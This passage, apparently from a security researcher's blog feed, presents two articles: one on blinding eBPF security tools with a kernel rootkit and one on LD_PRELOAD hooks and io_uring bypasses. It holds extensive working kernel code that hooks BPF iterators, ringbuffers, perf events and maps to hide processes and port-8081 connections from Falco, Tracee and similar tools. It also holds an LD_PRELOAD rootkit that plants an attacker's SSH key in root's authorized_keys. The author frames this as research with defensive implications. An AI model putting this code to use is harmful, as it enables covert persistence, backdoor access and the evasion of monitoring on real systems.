efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And several other things.\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And several other things.\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nBPF Iterators Can Be Filtered: Tools like GhostScan and Decloaker that enumerate kernel objects can be defeated by hooking bpf_iter_run_prog()\nRingbuffers Can Be Intercepted: Falco and Tracee\u0026rsquo;s event streams can be selectively filtered by hooking ringbuffer operations\nPerf Events Can Be Blocked: Legacy monitoring tools using perf events are equally vulnerable\nBPF Maps Can Be Manipulated: Security tools that track state in BPF maps can operate on incomplete data\nFtrace Enables Invisible Hooks: Hooking via ftrace allows interception without modifying kernel code or using obvious techniques like syscall table hooking\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = 